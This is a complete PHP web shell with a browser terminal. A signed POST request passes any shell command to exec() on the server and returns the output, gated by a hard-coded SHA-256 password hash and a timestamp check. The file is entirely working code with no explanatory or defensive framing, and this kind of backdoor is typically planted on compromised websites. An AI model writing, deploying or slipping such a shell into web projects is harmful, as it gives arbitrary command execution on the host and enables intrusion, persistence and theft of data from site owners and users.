<?php
// php -r "echo hash('sha256','myPassword');" > password.log
$password = '76549b827ec46e705fd03831813fa52172338f0dfcbd711ed44b81a96dac51c6';
if (!function_exists('hash_algos') || !in_array('sha256',hash_algos()) || !is_callable('exec')) {
   exit('Sorry, there are no required dependencies on this server.');
}
$user = false;
if (isset($_POST['sig'], $_POST['cmd'], $_POST['salt'])) {
    header('Content-type: application/json');
    if (!preg_match('~^[0-9]{10}$~',strval($_POST['salt'])) || intval($_POST['salt']) < time()-15) exit(json_encode('Error: timeout'));
    if (myHash($_POST['salt'].$_POST['cmd'].$password) !== $_POST['sig']) {
        header('HTTP/1.1 403 Required authorization',true,403);
        exit(json_encode('Error: signature'));
    }
    set_time_limit(1000);
    $params = array();
    if (!empty($_POST['cwd'])) @chdir($_POST['cwd']);
    exec($_POST['cmd'], $out, $error);
    $params['return'] = $error;
    if (0===$error && preg_match('~^cd\s+(.*)$~i',$_POST['cmd'],$matches)) {
        @chdir($matches[1]);
        $params['cwd'] = getcwd();
    }
    exit(json_encode(array('out'=>$out)+$params));
}
function myHash($str) { return hash('sha256',$str); }
function e($str) { return htmlspecialchars($str); }
header("Content-Security-Policy: default-src 'none'; connect-src 'self'; script-src 'unsafe-inline'; style-src 'unsafe-inline';");
header("Content-type: text/html; charset=utf-8");
?>
<!DOCTYPE html>
<html lang="en"><head><title><?=e($_SERVER['HTTP_HOST'])?></title>
<style>body{margin:0;padding:1%}input,textarea{font-family:monospace;font-size:12px;padding:1%;width:98%}</style>
</head><body>
<textarea rows="20" cols="100" id="s" readonly="readonly"></textarea><input id="c" size="100"/>
<script>
(function(){
    function SHA256(l){function e(c,b){var d=(c&65535)+(b&65535);return(c>>16)+(b>>16)+(d>>16)<<16|d&65535}function h(c,b){return c>>>b|c<<32-b}l=function(c){c=c.replace(/\r\n/g,"\n");for(var b="",d=0;d<c.length;d++){var a=c.charCodeAt(d);128>a?b+=String.fromCharCode(a):(127<a&&2048>a?b+=String.fromCharCode(a>>6|192):(b+=String.fromCharCode(a>>12|224),b+=String.fromCharCode(a>>6&63|128)),b+=String.fromCharCode(a&63|128))}return b}(l);return function(c){for(var b="",d=0;d<4*c.length;d++)b+="0123456789abcdef".charAt(c[d>>
        2]>>8*(3-d%4)+4&15)+"0123456789abcdef".charAt(c[d>>2]>>8*(3-d%4)&15);return b}(function(c,b){var d=[1116352408,1899447441,3049323471,3921009573,961987163,1508970993,2453635748,2870763221,3624381080,310598401,607225278,1426881987,1925078388,2162078206,2614888103,3248222580,3835390401,4022224774,264347078,604807628,770255983,1249150122,1555081692,1996064986,2554220882,2821834349,2952996808,3210313671,3336571891,3584528711,113926993,338241895,666307205,773529912,1294757372,1396182291,1695183700,1986661051,
        2177026350,2456956037,2730485921,2820302411,3259730800,3345764771,3516065817,3600352804,4094571909,275423344,430227734,506948616,659060556,883997877,958139571,1322822218,1537002063,1747873779,1955562222,2024104815,2227730452,2361852424,2428436474,2756734187,3204031479,3329325298],a=[1779033703,3144134277,1013904242,2773480762,1359893119,2600822924,528734635,1541459225],n=Array(64),p,r,s,l,q,u,v,k,w,f,g,x;c[b>>5]|=128<<24-b%32;c[(b+64>>9<<4)+15]=b;for(w=0;w<c.length;w+=16){p=a[0];r=a[1];s=a[2];l=a[3];
        q=a[4];u=a[5];v=a[6];k=a[7];for(f=0;64>f;f++){if(16>f)n[f]=c[f+w];else{g=n;x=f;var m;m=n[f-2];m=h(m,17)^h(m,19)^m>>>10;m=e(m,n[f-7]);var t;t=n[f-15];t=h(t,7)^h(t,18)^t>>>3;g[x]=e(e(m,t),n[f-16])}g=q;g=h(g,6)^h(g,11)^h(g,25);g=e(e(e(e(k,g),q&u^~q&v),d[f]),n[f]);k=p;k=h(k,2)^h(k,13)^h(k,22);x=e(k,p&r^p&s^r&s);k=v;v=u;u=q;q=e(l,g);l=s;s=r;r=p;p=e(g,x)}a[0]=e(p,a[0]);a[1]=e(r,a[1]);a[2]=e(s,a[2]);a[3]=e(l,a[3]);a[4]=e(q,a[4]);a[5]=e(u,a[5]);a[6]=e(v,a[6]);a[7]=e(k,a[7])}return a}(function(c){for(var b=
        [],d=0;d<8*c.length;d+=8)b[d>>5]|=(c.charCodeAt(d/8)&255)<<24-d%32;return b}(l),8*l.length))};
    function _(s) { return document.getElementById(s); }
    function ready() {
        try {if (this.readyState === 4) {
            if (this.status === 200) {
                var v = JSON.parse(this.responseText);
                if (v.cwd) {
                    cwd = v.cwd;
                    _('c').placeholder = cwd;
                }
                if (v.return) {
                    _('s').value += '(FAILED)'+"\n";
                }
                _('s').value += (('object'==typeof(v)) ? v.out.join("\n") : v) + "\n";
                _('s').scrollTop = 1000000;
            }
            if (this.status === 403) {
                password = false;
                _('s').value = '';
            }
        }} catch(e) { alert('Caught Exception: ' + e.description); }
    }
    function send() {
        var x=new XMLHttpRequest(), date=Math.round((new Date).getTime()/1000), pw=getPassword();
        if (!pw) return;
        x.open('POST','<?=$_SERVER['PHP_SELF']?>',true);
        x.onreadystatechange = ((function(x){return function(){ready.call(x)}})(x));
        var form = new FormData(), data={cmd:_('c').value,salt:date,cwd:cwd};
        for(var i in data) form.append(i,data[i]);
        form.append('sig', SHA256(data.salt+data.cmd+pw));
        x.send(form);
    }
    var password = false, cwd = false, history = [], current = 0;
    function getPassword() {
        if (password) return password;
        var c = prompt('Enter a password:');
        if (c && c.length) password = SHA256(c);
        return password;
    }
    _('c').onkeydown=function(e){
        if (13==e.keyCode) {
            if (_('c').value.length) history.push(_('c').value);
            send();
            _('s').value += '$ '+_('c').value+"\n";
            _('c').value = '';
        }
        if (38==e.keyCode) {
            current--;
            if (current==-1) return _('c').value = '';
            if (current<-1) current = history.length-1;
            if (history[current]) _('c').value = history[current];
        }
        if (40==e.keyCode) {
            current++;
            if (current==history.length) return _('c').value = '';
            if (current>history.length) current=0;
            if (history[current]) _('c').value = history[current];
        }
    };
    _('c').focus();
})();
</script>
</body></html>